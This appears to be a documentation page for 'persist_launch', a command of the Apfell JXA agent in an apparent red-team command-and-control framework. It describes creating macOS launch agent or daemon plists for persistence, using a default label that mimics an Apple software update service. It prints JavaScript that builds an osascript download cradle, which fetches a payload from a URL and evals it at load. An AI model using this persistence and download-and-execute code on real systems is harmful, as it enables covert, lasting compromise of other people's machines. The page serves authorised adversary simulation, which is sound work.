+++
title = "persist_launch"
chapter = false
weight = 100
hidden = false
+++

## Summary

Create a launch agent or daemon plist file and either automatically put it in ~/Library/LaunchAgents or if LocalAgent is false, save it to the specified location. If you want an elevated launch agent or launch daemon( /Library/LaunchAgents or /Library/LaunchDaemons), you either need to be in an elevated context already and specify the path or use something like shell_elevated to copy it there. 

If the first arg is 'apfell-jxa' then the agent will automatically construct a plist appropriate oneliner to use where arg1 should be the URL to reach out to for the payload. 
- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

#### args

- Description: List of arguments to execute in the ProgramArguments section of the PLIST  
- Required Value: True  
- Default Value: None  

#### KeepAlive

- Description: Restart the persistence if it crashes for some reason  
- Required Value: True  
- Default Value: True  

#### label

- Description: The label for the launch element  
- Required Value: True  
- Default Value: com.apple.softwareupdateagent  

#### LaunchPath

- Description: Path to save new plist to if LocalAgent is false  
- Required Value: False  
- Default Value: None  

#### LocalAgent

- Description: Should be a local user launch agent?   
- Required Value: True  
- Default Value: True  

#### RunAtLoad

- Description: Should the launch element be executed at load  
- Required Value: True  
- Default Value: True  

## Usage

```
persist_launch
```

## MITRE ATT&CK Mapping

- T1159  
- T1160  
## Detailed Summary

This function can create a variety of different Launch* elements depending on the flags. The most confusing piece if probably the arguments section:
- If the first argument is `apfell-jxa` then that indicates to the agent that you want to create a plist with a download cradle in it. In this case, the second argument should be the URL that contains the payload. This can be seen with the code below:
```JavaScript
if(config.hasOwnProperty('args') && config['args'].length > 0){
    if(config['args'][0] === "apfell-jxa"){
        // we'll add in an apfell-jxa one liner to run
        template += "<string>/usr/bin/osascript</string>\n" +
        "<string>-l</string>\n" +
        "<string>JavaScript</string>\n" +
        "<string>-e</string>\n" +
        "<string>eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
        config['args'][1] + "')),$.NSUTF8StringEncoding)))</string>\n"
    }
    else{
        for(let i = 0; i < config['args'].length; i++){
            template += "<string>" + config['args'][i] + "</string>\n";
        }
    }
}
```
If the first argument isn't `apfell-jxa`, then you indicate to the agent that you have some other path + arguments you want to execute with the persistence mechanism (such as another binary or script you already dropped to disk).

